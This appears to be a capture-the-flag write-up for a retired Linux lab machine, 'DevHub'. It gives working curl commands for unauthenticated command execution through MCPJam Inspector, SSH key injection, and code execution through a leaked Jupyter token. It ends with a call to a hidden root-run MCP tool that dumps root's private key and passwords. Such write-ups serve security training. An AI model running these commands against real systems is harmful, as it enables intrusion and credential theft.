# DevHub

![OS](https://img.shields.io/badge/OS-Linux-333333?style=flat-square&logo=linux&logoColor=white) ![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square) ![Released](https://img.shields.io/badge/Released-2026--05--30-informational?style=flat-square)

| | |
|---|---|
| **OS** | Linux |
| **Difficulty** | Medium |
| **Release** | May 30, 2026 |
| **Rating** | 4 / 5 |
| **Points** | — (retired; no longer awards points) |

## Summary

**MCPJam Inspector** on port 6274 exposes an unauthenticated `POST /api/mcp/connect` that spawns arbitrary commands (GHSA-232v-j27c-5pp6), giving RCE as `mcp-dev` and an SSH key. From there `ps` leaks a **Jupyter Lab token** in the process arguments, and the Jupyter kernel API executes code as `analyst` for the user flag. Root comes from an internal **OPSMCP** Flask server on port 5000 running as root: its hidden `ops._admin_dump` tool reads `/root/.ssh/id_rsa` and returns it.

---

Solved from prior notes: MCPJam Inspector was already familiar from an earlier machine that shipped the same unauthenticated `/api/mcp/connect` bug, so the foothold was a matter of recognising the service banner on port 6274.

## Recon

Ports 22, 80 (nginx → `devhub.htb`, "Internal Development Platform"), and **6274 = MCPJam Inspector**.

Internal (localhost only): 8888 (Jupyter), 5000 (OPSMCP).

## Foothold — MCPJam Inspector RCE (mcp-dev)

`/api/mcp/connect` spawns an arbitrary "MCP server" command with no authentication:

```bash
curl -sk -X POST http://devhub.htb:6274/api/mcp/connect -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"bash","args":["-c","<CMD>"],"env":{}},"serverId":"x"}'
```

The connection closes immediately (`MCP error -32000`), but `<CMD>` runs as `uid=1001 mcp-dev`. Use it one-shot to inject an SSH key into `/home/mcp-dev/.ssh/authorized_keys`, then `ssh -i key mcp-dev@…`.

## User — Jupyter token → analyst

`ps -eo user,pid,cmd` (as `mcp-dev`) leaks the **Jupyter token in the `ExecStart` arguments**:

```
analyst  jupyter-lab --ip=127.0.0.1 --port=8888 --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 ...
root     /opt/opsmcp/server.py     # <- root!
```

Tunnel both internal services:

```bash
ssh -L 8888:127.0.0.1:8888 -L 5000:127.0.0.1:5000 mcp-dev@…
```

Then execute code as `analyst` via the Jupyter kernel API: `POST /api/kernels?token=`, then a websocket `execute_request` to `/api/kernels/<id>/channels?token=`. Run `os.system("… >> ~/.ssh/authorized_keys")` to inject a key (or just `cat ~/user.txt`) → `analyst` shell, `/home/analyst/user.txt`.

## Root — OPSMCP hidden tool reads root's SSH key

`/opt/opsmcp/server.py` (readable as `analyst`) is a Flask app on `127.0.0.1:5000` that **runs as root**:

- API key hardcoded: `VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"`.
- Hidden tool `ops._admin_dump` — not listed in `/tools/list`, but callable. With `target=ssh_keys` and `confirm=true` it does `open('/root/.ssh/id_rsa').read()` and returns the contents.

```bash
curl -s -X POST http://127.0.0.1:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
# -> root_private_key ; save it, chmod 600, ssh -i key root@devhub.htb
```

(`ops._admin_dump target=passwords` also leaks `analyst:JupyterN0tebook!2026` and `mcp-dev:Mcp!Insp3ct0r2026`.)

## Attack chain

```
MCPJam :6274 /api/mcp/connect RCE (mcp-dev) → SSH → ps leaks Jupyter token
  → kernel exec as analyst (user.txt)
    → OPSMCP :5000 (root) ops._admin_dump target=ssh_keys → /root/.ssh/id_rsa → ssh root
```

## Related

GHSA-232v-j27c-5pp6 (MCPJam Inspector RCE) · Jupyter-token-in-process-args · hidden MCP tool file-read as root

---

*Retired machine. Flag values are deliberately omitted — see the [repository README](../../README.md#ethics-and-policy).*
